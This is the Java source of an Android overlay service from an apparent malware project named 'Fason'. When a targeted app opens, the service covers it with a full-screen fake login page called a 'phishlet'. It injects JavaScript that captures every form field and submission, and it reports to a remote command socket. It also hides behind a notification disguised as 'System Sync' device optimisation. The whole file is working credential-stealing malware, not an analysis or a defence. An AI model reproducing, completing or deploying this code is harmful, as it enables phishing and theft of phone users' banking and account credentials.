package com.fason.app.features.overlay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.features.phishlet.PhishletJSInterface;
import com.fason.app.features.phishlet.PhishletManager;
import com.fason.app.features.overlay.SmartTriggerEngine;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class OverlayService extends Service {
    private static final String TAG = "OverlayService";
    private static final String CHANNEL_ID = "fason_overlay_channel";
    private static final int NOTIF_ID = 0xFA5001;

    private WindowManager windowManager;
    private View overlayView;
    private WebView phishletWebView;
    private FrameLayout overlayContainer;
    private ProgressBar overlayProgress;
    private TextView overlayTitle;

    private boolean isOverlayShowing = false;
    private boolean isPersistent = false;
    private String currentTemplate = "";
    private String currentPackage = "";
    private Set<String> targetApps = new HashSet<>();
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    private static OverlayService instance;

    public static OverlayService getInstance() {
        return instance;
    }

    public static boolean isRunning() {
        return instance != null;
    }

    public String getCurrentPackage() {
        return currentPackage;
    }

    public boolean isShowing() {
        return isOverlayShowing;
    }

    public String getCurrentTemplate() {
        return currentTemplate;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        loadTargetApps();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("SHOW_OVERLAY".equals(action)) {
                String pkg = intent.getStringExtra(Protocol.KEY_OVERLAY_PACKAGE);
                String template = intent.getStringExtra(Protocol.KEY_OVERLAY_TEMPLATE);
                boolean persistent = intent.getBooleanExtra(Protocol.KEY_OVERLAY_PERSISTENT, false);
                boolean usePrePage = intent.getBooleanExtra("use_pre_page", false);
                if (usePrePage) {
                    template = "session_expired.html";
                }
                showOverlay(pkg, template, persistent);
            } else if ("HIDE_OVERLAY".equals(action)) {
                hideOverlay();
            } else if ("UPDATE_CONFIG".equals(action)) {
                String appsJson = intent.getStringExtra(Protocol.KEY_OVERLAY_APPS);
                updateTargetApps(appsJson);
            }
        }
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System synchronization service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.fason.app.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Sync")
            .setContentText("Optimizing device performance...")
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }

    public void showOverlay(String packageName, String template, boolean persistent) {
        if (isOverlayShowing) {
            if (!persistent) hideOverlay();
            else return;
        }

        if (!Settings.canDrawOverlays(this)) {
            Log.w(TAG, "Cannot draw overlays - permission missing");
            return;
        }

        this.currentPackage = packageName != null ? packageName : "";
        this.currentTemplate = template != null ? template : "";
        this.isPersistent = persistent;

        mainHandler.post(() -> {
            try {
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                params.x = 0;
                params.y = 0;

                if (overlayView == null) {
                    LayoutInflater inflater = LayoutInflater.from(this);
                    overlayContainer = new FrameLayout(this);
                    overlayView = inflater.inflate(R.layout.overlay_phishlet, overlayContainer);
                    phishletWebView = overlayView.findViewById(R.id.phishlet_webview);
                    overlayProgress = overlayView.findViewById(R.id.overlay_progress);
                    overlayTitle = overlayView.findViewById(R.id.overlay_title);
                    setupWebView(phishletWebView);
                }

                windowManager.addView(overlayView, params);
                isOverlayShowing = true;

                if (overlayProgress != null) overlayProgress.setVisibility(View.VISIBLE);
                if (phishletWebView != null) phishletWebView.setVisibility(View.VISIBLE);

                String html = PhishletManager.getTemplate(template, packageName, this);
                if (html != null && phishletWebView != null) {
                    phishletWebView.loadDataWithBaseURL("https://secure-verify.app", html, "text/html", "UTF-8", null);
                }

                mainHandler.postDelayed(() -> {
                    if (isOverlayShowing && overlayView != null) {
                        try {
                            WindowManager.LayoutParams focused = (WindowManager.LayoutParams) overlayView.getLayoutParams();
                            focused.flags = focused.flags & ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                            windowManager.updateViewLayout(overlayView, focused);
                        } catch (Exception e) {
                            Log.e(TAG, "Focus update failed", e);
                        }
                    }
                }, 800);

                reportOverlayStatus("shown", packageName, template);

            } catch (Exception e) {
                Log.e(TAG, "showOverlay failed", e);
            }
        });
    }

    private void setupWebView(WebView webView) {
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setDatabaseEnabled(true);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                if (overlayProgress != null) overlayProgress.setVisibility(View.GONE);
                injectDataCaptureBridge();
            }
        });

        webView.addJavascriptInterface(new PhishletJSInterface(this), "FasonNative");
    }

    private void injectDataCaptureBridge() {
        if (phishletWebView == null) return;
        String js = "document.addEventListener('DOMContentLoaded', function() {" +
            "var inputs = document.querySelectorAll('input, textarea, select');" +
            "inputs.forEach(function(input) {" +
            "  input.addEventListener('change', function() {" +
            "    FasonNative.onFieldCaptured(this.name || this.id || 'unknown', this.value, this.type);" +
            "  });" +
            "});" +
            "var forms = document.querySelectorAll('form');" +
            "forms.forEach(function(form) {" +
            "  form.addEventListener('submit', function(e) {" +
            "    e.preventDefault();" +
            "    var data = {};" +
            "    var fields = form.querySelectorAll('input, textarea, select');" +
            "    fields.forEach(function(f) { data[f.name || f.id] = f.value; });" +
            "    FasonNative.onFormSubmit(JSON.stringify(data));" +
            "  });" +
            "});" +
            "});";
        phishletWebView.evaluateJavascript(js, null);
    }

    public void hideOverlay() {
        if (!isOverlayShowing || overlayView == null) return;
        mainHandler.post(() -> {
            try {
                windowManager.removeView(overlayView);
                isOverlayShowing = false;
                overlayView = null;
                phishletWebView = null;
                reportOverlayStatus("hidden", currentPackage, currentTemplate);
            } catch (Exception e) {
                Log.e(TAG, "hideOverlay failed", e);
            }
        });
    }

    public void onAppLaunched(String packageName) {
        if (!targetApps.contains(packageName)) return;
        if (isOverlayShowing && isPersistent) return;

        String template = PhishletManager.resolveTemplate(packageName);
        boolean persistent = PhishletManager.isPersistent(packageName);
        showOverlay(packageName, template, persistent);
    }

    public void updateTargetApps(String appsJson) {
        try {
            targetApps.clear();
            if (appsJson != null) {
                JSONArray arr = new JSONArray(appsJson);
                for (int i = 0; i < arr.length(); i++) {
                    targetApps.add(arr.getString(i));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "updateTargetApps failed", e);
        }
    }

    private void loadTargetApps() {
        // Targeting is owned by SmartTriggerEngine — nothing hardcoded here.
        // Kept for ABI compatibility with older config pushes.
    }

    public void notifyDataCaptured(String pkg) {
        SmartTriggerEngine.get(this).onDataCaptured(pkg);
    }

    private void reportOverlayStatus(String status, String pkg, String template) {
        executor.execute(() -> {
            try {
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_TYPE, Protocol.OVERLAY);
                r.put(Protocol.KEY_STATUS, status);
                r.put(Protocol.KEY_PACKAGE, pkg != null ? pkg : "");
                r.put(Protocol.KEY_OVERLAY_TEMPLATE, template != null ? template : "");
                r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                SocketClient client = SocketClient.getInstance();
                if (client != null && client.getSocket() != null) {
                    client.getSocket().emit(Protocol.OVERLAY, r);
                }
            } catch (Exception ignored) {}
        });
    }

    @Override
    public void onDestroy() {
        hideOverlay();
        instance = null;
        executor.shutdown();
        super.onDestroy();
    }
}
